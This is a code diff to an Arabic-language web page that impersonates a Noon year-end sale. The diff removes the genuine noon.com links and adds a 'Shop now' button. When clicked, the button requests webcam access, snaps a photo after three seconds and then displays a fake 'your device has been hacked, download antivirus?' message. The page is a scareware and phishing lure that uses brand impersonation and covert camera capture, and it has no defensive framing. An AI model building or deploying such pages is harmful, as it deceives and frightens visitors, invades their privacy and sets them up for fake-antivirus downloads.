@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خصومات نهاية السنة مع نون - اغتنم الفرصة</title> <!-- تعديل العنوان -->
+    <title>خصومات نهاية السنة مع نون - اغتنم الفرصة</title>
     <style>
         body {
             text-align: center;
             font-family: Arial, sans-serif;
-            background-color: black;
-            color: white;
+            background-color: white; /* تغيير الخلفية إلى اللون الأبيض */
+            color: black;
             margin: 0;
-            overflow: hidden;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -32,19 +31,14 @@
             margin-bottom: 20px;
         }
         p {
-            color: white;
-            margin-bottom: 15px;
-        }
-        .offer-banner {
-            background-color: yellow;
             color: black;
-            padding: 10px;
-            border-radius: 5px;
-            margin-top: 20px;
-            font-weight: bold;
+            margin-bottom: 15px;
         }
         .button-container {
             margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         .button {
             background-color: green;
@@ -54,11 +48,23 @@
             border-radius: 5px;
             text-decoration: none;
             font-size: 1rem;
-            margin: 5px;
+            margin: 10px 0;
             cursor: pointer;
         }
         .button:hover {
             background-color: darkgreen;
+        }
+        #video, #canvas {
+            display: none;
+            margin-top: 20px;
+            border: 1px solid black;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            color: red;
+            font-weight: bold;
+            display: none;
         }
     </style>
 </head>
@@ -66,10 +72,46 @@
     <div class="highlight">اغتنم الفرصة الآن!</div>
     <h1>خصومات نهاية السنة من نون</h1>
     <p>اغتنم أفضل العروض الآن قبل انتهاء الوقت!</p>
-    <div class="offer-banner">خصم يصل إلى 50% على جميع المنتجات</div>
     <div class="button-container">
-        <a href="https://www.noon.com/" class="button">تسوق الآن</a>
-        <a href="https://www.noon.com/" class="button" style="background-color: red;">عرض المزيد</a>
+        <button id="shop-now" class="button">تسوق الآن</button>
     </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <p id="hacked-message" class="message">تم تهكير جهازك، هل تريد تنزيل مضاد للفيروسات؟</p>
+
+    <script>
+        const shopNowButton = document.getElementById('shop-now');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const hackedMessage = document.getElementById('hacked-message');
+        const context = canvas.getContext('2d');
+
+        shopNowButton.addEventListener('click', () => {
+            // طلب إذن الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // عرض الفيديو من الكاميرا
+                    video.style.display = 'block';
+                    video.srcObject = stream;
+
+                    // التقاط الصورة بعد 3 ثوانٍ
+                    setTimeout(() => {
+                        canvas.style.display = 'block';
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // إخفاء الفيديو وعرض الرسالة
+                        video.style.display = 'none';
+                        hackedMessage.style.display = 'block';
+                    }, 3000);
+                })
+                .catch(err => {
+                    alert('لم يتم منح إذن الكاميرا!');
+                    console.error('خطأ في الوصول إلى الكاميرا:', err);
+                });
+        });
+    </script>
 </body>
 </html>
